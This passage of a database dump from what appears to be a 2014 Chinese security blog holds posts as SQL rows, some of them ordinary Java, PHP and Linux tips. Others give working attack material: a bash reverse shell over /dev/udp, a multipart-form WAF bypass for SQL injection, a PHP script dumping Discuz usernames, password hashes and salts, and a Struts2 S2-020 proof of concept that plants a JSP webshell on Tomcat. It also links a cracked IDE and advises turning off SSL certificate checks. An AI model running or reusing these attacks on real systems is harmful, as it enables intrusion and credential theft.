Shell(){ \n        LENGTH=0 \n        DoRealShell | while read line \n        do \n                echo $line \n        done \n} \nfunction StartShell(){ \n        Shell &gt;$PIPE2 2&gt;&amp;1 &lt;$PIPE \n} \nfunction MakeConn(){ \n        echo Welcome back \n        cat $PIPE2 &amp; \n        cat - &gt;$PIPE &amp; \n} \nMakeConn &lt;/dev/udp/$REVIP/$REVPORT 2&gt;&amp;0 1&gt;&amp;0 \nPIDCONN=$! \nStartShell \nrm -rf $PIPE \nrm -rf $PIPE2</pre>\n<p>又研究了一下，其实根本没有那么复杂，而且完美解决退出和多行的问题，上个帖子你们就忽略吧 ‘</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/18.jpg\"><img class=\"alignnone size-full wp-image-983\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/18.jpg\" alt=\"\" width=\"443\" height=\"268\" /></a></p>\n<pre class=\"brush: shell; gutter: true\">#!/bin/bash \nexec 3&gt;/dev/udp/127.0.0.1/8080 \nexec 2&gt;&amp;3 \nexec 1&gt;&amp;3 \necho Welcom back \ncat 0&lt;&amp;3 | bash | while read line;do echo $line;done</pre>', null, '2014-03-25 18:31:17', '1', '815', null, '0', '2014-03-25 19:12:03'), ('988', '1', '3', 'IntelliJ IDEA 13.x for mac 破解', '园长', '支持idea官方最新版破解，From:Csdn\n<p>下载地址：<a href=\" http://pan.baidu.com/s/1tlafO\">IntelliJ IDEA 13.x for mac 破解 </a>密码: 3k1c</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/19.jpg\"><img class=\"alignnone size-full wp-image-990\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/19.jpg\" alt=\"\" width=\"695\" height=\"495\" /></a></p>', null, '2014-03-29 18:40:45', '1', '559', null, '2', '2014-06-02 20:07:29'), ('993', '1', '14', '轻松绕各种WAF的POST注入、跨站防御(比如安全狗)', '园长', 'XXX之前有提过multipart请求绕过各种WAF方式：<a href=\"http://wooyun.org/bugs/wooyun-2010-044349\" target=\"_blank\">360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一</a>，貌似没引起多少人关注。今天发现安全狗变聪明了以前那套他不吃了，不过随手给狗提交了一个二进制的文件域就XXOO了。注意一定要是二进制文件，图片、压缩包什么的都行。\n<p>构建如下HTML表单：</p>\n<pre class=\"brush: html; gutter: true\">&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;\n&lt;title&gt;yzmm - p2j.cn&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n	&lt;form action=&quot;http://192.168.199.151/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;\n       File:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br/&gt;\n        ID:&lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;select 1 from mysql.user--&quot; style=&quot;width:250px;&quot; / &gt;&lt;br/&gt;\n        &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;</pre>\n<p>index.php:</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php\n	echo &quot;POST-ID:&quot;.$_POST[&#039;id&#039;].&quot;&lt;br/&gt;GET-ID:&quot;.$_GET[&#039;id&#039;];\n?&gt;</pre>\n<p>提交如下请求：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/110.jpg\"><img class=\"alignnone size-full wp-image-1071\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/110.jpg\" width=\"535\" height=\"453\" /></a></p>\n<p>提交带二进制文件的请求：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/25.jpg\"><img class=\"alignnone size-full wp-image-995\" title=\"2\" alt=\"\" src=\"http://javaweb.org/wp-content/uploads/2014/03/25.jpg\" width=\"361\" height=\"252\" /></a></p>\n<p>成功绕过。</p>', null, '2014-03-30 19:28:02', '1', '554', null, '2', '2014-04-15 14:01:08'), ('1002', '1', '14', 'PHP discuz友情备份', '园长', '灰常简单,小黑客用的。\n<pre class=\"brush: php; gutter: true\">&lt;?php\nfunction getFileById() {\n     $conn = mysql_connect (&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;);\n     mysql_select_db (&quot;数据库名&quot;);\n     mysql_query ( &quot;SET NAMES &#039;UTF8&#039;&quot; );\n     $result = mysql_query ( &quot;SELECT username,password,email,salt FROM pre_ucenter_members &quot;, $conn );\n     $d = &quot;&quot;;\n     while ( $data = mysql_fetch_array ( $result ) ) {\n          $d.=$data [&#039;username&#039;].&quot;---&quot;.$data[&#039;password&#039;].&quot;---&quot;.$data[&#039;email&#039;].&quot;---&quot;.$data[&#039;salt&#039;].&quot;\\n&quot;;\n     }\n     file_put_contents ( &quot;d:/wwwroot/back.sql&quot;, $d );\n     mysql_close ( $conn );\n}\ngetFileById ();\n?&gt;</pre>', null, '2014-03-31 10:44:26', '1', '565', null, '0', '2014-03-31 10:47:24'), ('1013', '1', '21', 'Weblogic war包部署时获取Web根目录问题', '园长', '在Weblogic当中如果以war包方式部署则不能用request.<span style=\"font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;\">getRealPath(\"/\")获取web根目录，</span>\n<pre>this.getClass().getClassLoader().getResource(&quot;/&quot;).getPath()即可获取：</pre>\n<pre class=\"brush: java; gutter: true\">    /**\n     * 获取web目录,Weblogic 默认以war包部署的时候不能用getRealPath\n     * getResource(&quot;/&quot;)获取的是当前应用所在的类路径，截取到WEB-INF\n     * 之后的路径就是当前应用的web根目录了\n     * @param request\n     * @return\n     */\n    public String getDocumentRoot(HttpServletRequest request){\n    	String webRoot = request.getSession().getServletContext().getRealPath(&quot;/&quot;);\n    	if(webRoot == null){\n    		webRoot = this.getClass().getClassLoader().getResource(&quot;/&quot;).getPath();\n    		webRoot = webRoot.substring(0,webRoot.indexOf(&quot;WEB-INF&quot;));\n    	}\n		return webRoot;\n    }</pre>\n<pre class=\"brush: java; gutter: true\"></pre>', null, '2014-04-01 11:39:44', '1', '763', null, '0', '2014-04-01 11:39:44'), ('1017', '1', '20', 'Jboss 6以上全局Filter加载顺序问题', '园长', '在之前调试Tomcat的时候就已经发现了Tomcat存在此问题<a href=\"http://javaweb.org/?p=576\">Tomcat7.0.30以上全局Filter加载顺序问题</a>，今天调试Jboss6的时候也发现了同样的问题。原因很简单，Jboss沿用了Tomcat的内核，Servlet容器那块核心代码是使用的Tomcat源码。\n<p>既然知道问题所在那么现在的问题就是要找到之前调试Tomcat出问题的类和方法。根据我之前的记录，Tomcat 的Filter加载问题出现的位置大约是在“org.apache.catalina.core.ApplicationFilterRegistration.java的版本变动(<strong>修改74-78行、103-107行</strong>)：Tomcat7.0.29的isMatchAfter判断的顺序反了。所以想办法把 顺序弄回去就行了。把context.addFilterMapBefore(filterMap);”。上一次我是改的catalina.jar的核心源码，所以在Jboss6目录搜索catalina.jar，发现没找到。搜catalina、Tomcat同样没找到对应的jar。估计是Jboss的开发人员把jar名改了，于是想写个递归遍历Jboss下所有的jar里面带有ApplicationFilterRegistration类或addFilterMapBefore方法的所有文件。</p>\n<p>实现目录搜索jar和内容：</p>\n<pre class=\"brush: actionscript3; gutter: true\">package jar;\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.Enumeration;\nimport java.util.jar.JarEntry;\nimport java.util.jar.JarFile;\nimport org.apache.commons.io.IOUtils;\npublic class Test {\n	public static void getJarContent(File jarFile){\n		try {\n			JarFile jf = new JarFile(jarFile);\n			Enumeration&lt;JarEntry&gt; je = jf.entries();\n			while(je.hasMoreElements()){\n				JarEntry jar = je.nextElement();\n				if(!jar.isDirectory()){\n					String str = IOUtils.toString(jf.getInputStream(jar));\n					if(jarFile.toString().contains(&quot;ApplicationFilterRegistration&quot;)){\n						System.out.println(&quot;ApplicationFilterRegistration:&quot;+jarFile.toString()+&quot;:&quot;+jar.getName());\n					}else if(str.contains(&quot;addFilterMapBefore&quot;)){\n						System.out.println(&quot;addFilterMapBefore:&quot;+jarFile.toString()+&quot;:&quot;+jar.getName());\n					}\n				}\n			}\n			jf.close();\n		} catch (IOException e) {\n			e.printStackTrace();\n		}\n	}\n	public static void listFile(File f){\n		File[] files = f.listFiles();\n		for(File ff:files){\n			if(ff.isDirectory()){\n				listFile(ff);\n			}else{\n				if(ff.toString().endsWith(&quot;.jar&quot;)){\n					getJarContent(ff);\n				}\n			}\n		}\n	}\n	public static void main(String[] args) {\n		listFile(new File(&quot;/Users/yz/Documents/install/jboss-6.0.0.Final/&quot;));\n	}\n}</pre>\n<p>一会儿功夫就完成了，输出结果：</p>\n<pre class=\"brush: java; gutter: true\">addFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/all/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/Context.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/all/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/ApplicationFilterConfig.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/all/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/StandardContext.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/default/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/Context.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/default/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/ApplicationFilterConfig.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/default/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/StandardContext.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/jbossweb-standalone/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/Context.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/jbossweb-standalone/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/ApplicationFilterConfig.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/jbossweb-standalone/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/StandardContext.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/standard/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/Context.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/standard/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/ApplicationFilterConfig.class\naddFilterMapBefore:/Users/yz/Documents/install/jboss-6.0.0.Final/server/standard/deploy/jbossweb.sar/jbossweb.jar:org/apache/catalina/core/StandardContext.class</pre>\n<p>搜索并未发现有ApplicationFilterRegistration这个类，Jboss的哥们又调皮了。虽然搜索结果出现了很多其实也就一个jar，Jboss默认配置有多个实例只看default目录下的就行了。</p>\n<p>反编译jbossweb.jar，找到对应的：</p>\n<p>Context.class、ApplicationFilterConfig.class、StandardContext.class这三个类</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/04/1.jpg\"><img class=\"alignnone size-full wp-image-1018\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/04/1.jpg\" alt=\"\" width=\"1163\" height=\"742\" /></a></p>\n<p>问题已经一目了然了，明显是采用了Tomcat7.0.29以上版本的Filter写法。Tomcat7.0.30开始if和else被调换了个顺序，导致加载全局Filter的时候会有一个BUG。只有在应用层404的情况下Filter才会走到全局拦截的Filter类里面去。解决办法当然是把if和else的内容换回来咯。</p>\n<p>Tomcat7.0.29和7.0.30变更内容：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/04/12.jpg\"><img class=\"alignnone size-full wp-image-1019\" title=\"12\" src=\"http://javaweb.org/wp-content/uploads/2014/04/12.jpg\" alt=\"\" width=\"1436\" height=\"800\" /></a></p>\n<p>无奈，╮（╯_╰）╭。</p>', null, '2014-04-02 01:47:29', '1', '779', null, '0', '2014-04-02 01:49:31'), ('1024', '2', '5', '解决PHP curl https时error 77(Problem with reading the SSL CA cert (path? access rights?))', 'blue', '服务器环境为CentOS，php-fpm，使用curl一个https站时失败，打开curl_error，捕获错误：Problem with reading the SSL CA cert (path? access rights?)\n<p>解决方案：</p>\n<p>1. sudo yum install ca-certificates （无论有没有，安装确认一下）</p>\n<p>2. 重启php-fpm，这步比较重要，更改底层的东西时一定要重启一下</p>\n<p>3. curl时设置：curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0)</p>', null, '2014-04-02 13:03:28', '1', '914', null, '0', '2014-04-02 14:54:34'), ('1032', '5', '14', '[百度安全中心博客-neobyte]Struts2 S2-020在Tomcat 8下的命令执行分析', 'Anonymous', '作者：neobyte\n<p>时间：2014-04-03</p>\n<p>Struts S2-020这个通告已经公布有一段时间了。目前大家都知道这个漏洞可以造成DOS、文件下载等危害，相信各大厂商也已经采取了相应的安全措施。今天是和大家分享一下对这个漏洞的一点研究，包括如何在Tomcat 8下导致RCE，目的是抛砖引玉，有不足之处欢迎大家指出。</p>\n<p><h2>1.属性列举</h2></p>\n<p>这个漏洞分析的一个难点在于：通过ognl的class.xx这种方式来遍历属性时，得到的是实际运行环境中的动态class，因此仅作静态分析是很困难的。例如classLoader，在不同容器中就各不相同。于是我编写了一个小脚本来自动枚举这样的属性：（这段脚本只考虑了int、string与boolean这些基本属性，未考虑数组等复杂的情况，实际情况下结果会更多）</p>\n<pre class=\"brush: java; gutter: true\">&lt;%@ page language=&quot;java&quot; import=&quot;java.lang.reflect.*&quot; %&gt;\n&lt;%!\npublic void processClass(Object instance, javax.servlet.jsp.JspWriter out, java.util.HashSet set, String poc){\n	try {\n	    Class&lt;?&gt; c = instance.getClass();\n	    set.add(instance);\n	    Method[] allMethods = c.getMethods();\n	    for (Method m : allMethods) {\n		if (!m.getName().startsWith(&quot;set&quot;)) {\n		    continue;\n		}\n		if (!m.toGenericString().startsWith(&quot;public&quot;)) {\n		    continue;\n		}\n		Class&lt;?&gt;[] pType  = m.getParameterTypes();\n		if(pType.length!=1) continue;\n		if(pType[0].getName().equals(&quot;java.lang.String&quot;)||\n		pType[0].getName().equals(&quot;boolean&quot;)||\n		pType[0].getName().equals(&quot;int&quot;)){\n			String fieldName = m.getName().substring(3,4).toLowerCase()+m.getName().substring(4);\n			out.print(poc+&quot;.&quot;+fieldName + &quot;&lt;br&gt;&quot;);\n		}\n	    }\n	    for (Method m : allMethods) {\n		if (!m.getName().startsWith(&quot;get&quot;)) {\n		    continue;\n		}\n		if (!m.toGenericString().startsWith(&quot;public&quot;)) {\n		    continue;\n		}		\n		Class&lt;?&gt;[] pType  = m.getParameterTypes();\n		if(pType.length!=0) continue;\n		if(m.getReturnType() == Void.TYPE) continue;\n		Object o = m.invoke(instance);\n		if(o!=null)\n		{\n			if(set.contains(o)) continue;\n			processClass(o,out, set, poc+&quot;.&quot;+m.getName().substring(3,4).toLowerCase()+m.getName().substring(4));	\n		} \n	    }\n	} catch (java.io.IOException x) {\n	    x.printStackTrace();\n	} catch (java.lang.IllegalAccessException x) {\n	    x.printStackTrace();\n	} catch (java.lang.reflect.InvocationTargetException x) {\n	    x.printStackTrace();\n	} 	\n}\n%&gt;\n&lt;%\njava.util.HashSet set = new java.util.HashSet&lt;Object&gt;();\nString poc = &quot;class.classLoader&quot;;\nexample.HelloWorld action = new example.HelloWorld();\nprocessClass(action.getClass().getClassLoader(),out,set,poc);\n%&gt;</pre>\n<p>在tomcat 8.0.3下Struts2.3.16的blank app中执行这段jsp，输出结果如下：</p>\n<pre class=\"brush: java; gutter: true\">（省略部分非相关属性）\nclass.classLoader.resources.context.parent.pipeline.first.encoding\nclass.classLoader.resources.context.parent.pipeline.first.directory\nclass.classLoader.resources.context.parent.pipeline.first.checkExists\nclass.classLoader.resources.context.parent.pipeline.first.renameOnRotate\nclass.classLoader.resources.context.parent.pipeline.first.fileDateFormat\nclass.classLoader.resources.context.parent.pipeline.first.prefix\nclass.classLoader.resources.context.parent.pipeline.first.rotatable\nclass.classLoader.resources.context.parent.pipeline.first.buffered\nclass.classLoader.resources.context.parent.pipeline.first.suffix\nclass.classLoader.resources.context.parent.pipeline.first.locale\nclass.classLoader.resources.context.parent.pipeline.first.requestAttributesEnabled\nclass.classLoader.resources.context.parent.pipeline.first.enabled\nclass.classLoader.resources.context.parent.pipeline.first.conditionUnless\nclass.classLoader.resources.context.parent.pipeline.first.conditionIf\nclass.classLoader.resources.context.parent.pipeline.first.pattern\nclass.classLoader.resources.context.parent.pipeline.first.condition\nclass.classLoader.resources.context.parent.pipeline.first.asyncSupported\nclass.classLoader.resources.context.parent.pipeline.first.domain\nclass.classLoader.resources.context.parent.pipeline.first.next.asyncSupported\nclass.classLoader.resources.context.parent.pipeline.first.next.domain\nclass.classLoader.resources.context.parent.pipeline.first.next.next.asyncSupported\nclass.classLoader.resources.context.parent.pipeline.first.next.next.domain\n......</pre>\n<p>这意味着Tomcat 8下至少有200多个boolean、int或string类型的属性是可以操纵的，虽然可修改不一定会产生危害，但至少说明这个漏洞的潜在风险不小。</p>\n<p><h2>2.POC</h2></p>\n<p>经过分析发现，通过下面的方法可以造成webshell的效果，最终导致Tomcat下的RCE。</p>\n<p>上面的属性中，有几个控制在tomcat上生成的access log的文件名，其默认值如下：</p>\n<pre class=\"brush: java; gutter: true\">class.classLoader.resources.context.parent.pipeline.first.directory =logs\nclass.classLoader.resources.context.parent.pipeline.first.prefix =localhost_access_log\nclass.classLoader.resources.context.parent.pipeline.first.suffix = .txt\nclass.classLoader.resources.context.parent.pipeline.first.fileDateFormat =.yyyy-mm-dd</pre>\n<p>默认情况下，生成的access log位于 logs目录（与webapps平行）下，文件名是localhost_access_log.2014-03-09.txt，但通过修改上面的属性值，可以导致在webapps目录下写入jspwebshell。具体步骤如下（以struts 2.3.16下的blank app为例）：</p>\n<p>1.访问下面的url来改变属性：</p>\n<p><a href=\"http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\">http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT</a></p>\n<p><a href=\"http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.prefix=shell\">http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.prefix=shell</a></p>\n<p><a href=\"http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\">http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</a></p>\n<p>2.访问下面的url来触发tomcat切换log（这里有个坑，这个属性必须是数字,这里设定为1），那么从此开始tomcat的access log将被记录入 webapps/ROOT/shell1.jsp中：</p>\n<p><a href=\"http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1\">http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1</a></p>\n<p>3.通过发包访问下面的请求，在access log中植入代码</p>\n<p><a href=\"http://127.0.0.1/struts2-blank/example/aaaa.jsp?a=%3c%25Runtime.getRuntime().exec(%22calc%22);%25\">http://127.0.0.1/struts2-blank/example/aaaa.jsp?a=&lt;%Runtime.getRuntime().exec(\"calc\");%</a>&gt;</p>\n<p>访问上述请求后，就可以看到生成了webapps/ROOT/shell1.jsp，内容如下：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/04/1.png\"><img class=\"alignnone size-full wp-image-1033\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/04/1.png\" alt=\"\" width=\"1323\" height=\"169\" /></a></p>\n<p>4.结合前面设定的参数，访问下面的url，观察shell执行<a href=\"http://127.0.0.1/shell1.jsp\">http://127.0.0.1/shell1.jsp</a></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/04/2.png\"><img class=\"alignnone size-full wp-image-1034\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/04/2.png\" alt=\"\" width=\"1273\" height=\"483\" /></a></p>\n<p>通过分析，上面的POC中class.classLoader.resources.context.parent.pipeline.first这个属性实际是org.apache.catalina.valves.AccessLogValve，在conf/server.xml里面有一段相关的配置：</p>\n<pre class=\"brush: xml; gutter: true\">&lt;!-- Access log processes allexample.\n             Documentation at:/docs/config/valve.html\n             Note: The pattern used isequivalent to using pattern=&quot;common&quot; --&gt;\n        &lt;ValveclassName=&quot;org.apache.catalina.valves.AccessLogValve&quot;directory=&quot;logs&quot;\n              prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot;\n               pattern=&quot;%h %l %u %t&amp;quot;%r&amp;quot; %s %b&quot; /&gt;</pre>\n<p>为何修改了dataformat会触发切换日志呢？注意下面一个属性，默认是true</p>\n<pre class=\"brush: java; gutter: true\"> .class.classLoader.resources.context.parent.pipeline.first.rotatable</pre>\n每次Log时，都会调用rotate:\n<pre class=\"brush: java; gutter: true\">publicvoid log(CharArrayWriter message)\n  {\nrotate();\n…</pre>\n<p>而rotate是检查当前的systime 经过format后，与当前的tsDate是否相同。如果日期不同了，自然需要切换日志文件了：</p>\n<pre class=\"brush: java; gutter: true\">public void rotate()\n  {\n    if (this.rotatable)\n    {\n      long systime =System.currentTimeMillis();\n      if (systime - this.rotationLastChecked&gt; 1000L)\n        synchronized (this) {\n          if (systime -this.rotationLastChecked &gt; 1000L) {\n            this.rotationLastChecked = systime;\n            String tsDate =this.fileDateFormatter.format(new Date(systime));\n            if (!this.dateStamp.equals(tsDate)){\n              close(true);\n              this.dateStamp = tsDate;\n              open();\n            }\n          }\n        }\n    }\n  }</pre>\n<p>而我们之前已经修改了dateFormat，所以就触发了日志切换。这个特性与具体的OS无关，是tomcat代码决定的。在linux与windows下证实该问题均存在。</p>\n<p><h3>3.后记</h3></p>\n<p>这个POC距离实际的攻击还有一定的距离，发表此文仅供技术研究使用，请勿用于实际攻击。另外，也许还有其他的利用方式，Tomcat 8下那么多的可操控的属性，或许有别的也可以RCE？其他的容器下，是否也有这么多的可操控属性呢？欢迎感兴趣的同学与我们BSRC的同学讨论。</p>', null, '2014-04-03 21:42:18', '1', '620', null, '3', '2014-04-03 22:43:11'), ('1037', '1', '3', 'Java gitlab客户端登陆', '园长', 'Java有非常多的开源库，其中也包括了非常火的GitHub和Gitlab。\n<p>Git地址：<a href=\"https://github.com/timols/java-gitlab-api\">java-gitlab-api</a></p>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1kT8yURd\">Java GitLab登陆Demo.zip</a></p>\n<p>基本上一两行代理就能实现登陆功能，剩下的或许就是一个for循环就可以搞定了。</p>\n<p>测试Demo:</p>\n<pre class=\"brush: actionscript3; gutter: true\">package org.gitlab.api.test;\nimport java.io.IOException;\nimport org.gitlab.api.GitlabAPI;\nimport org.gitlab.api.models.GitlabSession;\npublic class Test {\n	public static void main(String[] args) {\n		try {\n			GitlabSession ga = GitlabAPI.connect(&quot;http://11.30.41.52&quot;, &quot;xxxx@p2j.cn&quot;, &quot;xxxxxpass&quot;);\n			System.out.println(&quot;State:&quot;+ga.getState());\n			System.out.println(&quot;IsAdmin:&quot;+ga.isAdmin());\n		} catch (IOException e) {\n			e.printStackTrace();\n		}\n	}\n}</pre>\n<pre class=\"brush: actionscript3; gutter: true\"></pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2014/04/11.jpg\"><img title=\"1\" alt=\"\" src=\"http://javaweb.org/wp-content/uploads/2014/04/11.jpg\" width=\"1102\" height=\"412\" /></a>', null, '2014-04-04 10:37:51', '1', '594', null, '0', '2014-04-15 10:17:11'), ('1041', '1', '14', 'OpenSSL 高危漏洞', '园长', '下载地址：<a href=\"http://pan.baidu.com/s/1c0vggSg\">ssltest.py</a>\n<p>绝对高危，可读取对方服务器内存信息(sessionid之类都有)。</p>', null, '2014-04-08 15:33:40', '1', '517', null, '1', '2014-04-10 19:32:45'), ('1045', '2', '14', 'OpenSSL HeartBleed漏洞CentOS下简单修复过程', 'blue', '今天这个洞比较火，赶紧测试了下自己的网站，果然存在问题，简单的修复过程如下(CentOS 6.5)：\n<pre class=\"brush: shell; gutter: true\">yum search openssl \n#返回 \nUpdating: \nopenssl  x86_64  1.0.1e-16.el6_5.7    updates   1.5 M \nUpdating for dependencies: \nopenssl-devel  x86_64  1.0.1e-16.el6_5.7   updates    1.2 M \n看起来版本还是比较新的，遂直接 \nyum install openssl \n#然后重启nginx \n/etc/init.d/nginx restart \n#测试漏洞已修复</pre>\n<p>本来想源码编译安装的，因为以上过程便已修复，就没编译，如果yum方法不行，尝试以下安装：</p>\n<pre class=\"brush: shell; gutter: true\">wget http://www.openssl.org/source/openssl-1.0.1g.tar.gz \ncd openssl-1.0.1g \n./config \nmake &amp;&amp; make install \n/etc/init.d/nginx restart #重启nginx</pre>\n<p>测试下是否修复了吧～ _^</p>', null, '2014-04-08 21:15:50', '1', '705', null, '2', '2014-04-15 13:50:17'), ('1053', '1', '3', 'Java RC4加密乱码问题', '园长', '今天调了下Java的RC4乱码，主要原因并不是byte问题，而是解密时编码问题。\n<pre class=\"brush: java; gutter: true\">import java.io.UnsupportedEncodingException;\npublic class RC4 {\n    public static String decryptionRC4(byte[] data, String key) {\n        if (data == null || key == null) {\n            return null;\n        }\n        return new String(RC4Base(data, key));\n    }\n    public static byte[] encryptionRC4Byte(String data, String key) {\n        if (data == null || key == null) {\n            return null;\n        }\n        byte b_data[] = null;\n		try {\n			b_data = data.getBytes(&quot;UTF-8&quot;);\n		} catch (UnsupportedEncodingException e) {\n			e.printStackTrace();\n		}\n        return RC4Base(b_data, key);\n    }\n    private static byte[] initKey(String aKey) {\n        byte[] b_key = null;\n		try {\n			b_key = aKey.getBytes(&quot;UTF-8&quot;);\n		} catch (UnsupportedEncodingException e) {\n			e.printStackTrace();\n		}\n        byte state[] = new byte[256];\n        for (int i = 0; i &lt; 256; i++) {\n            state[i] = (byte) i;\n        }\n        int index1 = 0;\n        int index2 = 0;\n        if (b_key == null || b_key.length == 0) {\n            return null;\n        }\n        for (int i = 0; i &lt; 256; i++) {\n            index2 = ((b_key[index1] &amp; 0xff) + (state[i] &amp; 0xff) + index2) &amp; 0xff;\n            byte tmp = state[i];\n            state[i] = state[index2];\n            state[index2] = tmp;\n            index1 = (index1 + 1) % b_key.length;\n        }\n        return state;\n    }\n    private static byte[] RC4Base(byte[] input, String mKkey) {\n        int x = 0;\n        int y = 0;\n        byte key[] = initKey(mKkey);\n        int xorIndex;\n        byte[] result = new byte[input.length];\n        for (int i = 0; i &lt; input.length; i++) {\n            x = (x + 1) &amp; 0xff;\n            y = ((key[x] &amp; 0xff) + y) &amp; 0xff;\n            byte tmp = key[x];\n            key[x] = key[y];\n            key[y] = tmp;\n            xorIndex = ((key[x] &amp; 0xff) + (key[y] &amp; 0xff)) &amp; 0xff;\n            result[i] = (byte) (input[i] ^ key[xorIndex]);\n        }\n        return result;\n    }\n}</pre>', null, '2014-04-14 23:21:35', '1', '680', null, '0', '2014-04-15 01:28:58'), ('1063', '1', '5', 'PHP RC4加密Demo', '园长', 'PHP的源码和前面发 的那个<a href=\"http://javaweb.org/?p=1053\">JAVA的RC4加密</a>基本连参数都是一样的，PHP加密后两边都可以直接解密。\n<p>源码:</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php\nfunction rc4($key_str, $data_str) {\n	// convert input string(s) to array(s)\n	$key = array ();\n	$data = array ();\n	for($i = 0; $i &lt; strlen ( $key_str ); $i ++) {\n		$key [] = ord ( $key_str {$i} );\n	}\n	for($i = 0; $i &lt; strlen ( $data_str ); $i ++) {\n		$data [] = ord ( $data_str {$i} );\n	}\n	// prepare key\n	$state = array (\n		0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,\n		16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,\n		32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,\n		48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,\n		64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,\n		80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,\n		96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,\n		112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,\n		128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,\n		144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,\n		160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,\n		176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,\n		192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,\n		208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,\n		224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,\n		240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255\n	);\n	$len = count ( $key );\n	$index1 = $index2 = 0;\n	for($counter = 0; $counter &lt; 256; $counter ++) {\n		$index2 = ($key [$index1] + $state [$counter] + $index2) % 256;\n		$tmp = $state [$counter];\n		$state [$counter] = $state [$index2];\n		$state [$index2] = $tmp;\n		$index1 = ($index1 + 1) % $len;\n	}\n	// rc4\n	$len = count ( $data );\n	$x = $y = 0;\n	for($counter = 0; $counter &lt; $len; $counter ++) {\n		$x = ($x + 1) % 256;\n		$y = ($state [$x] + $y) % 256;\n		$tmp = $state [$x];\n		$state [$x] = $state [$y];\n		$state [$y] = $tmp;\n		$data [$counter] ^= $state [($state [$x] + $state [$y]) 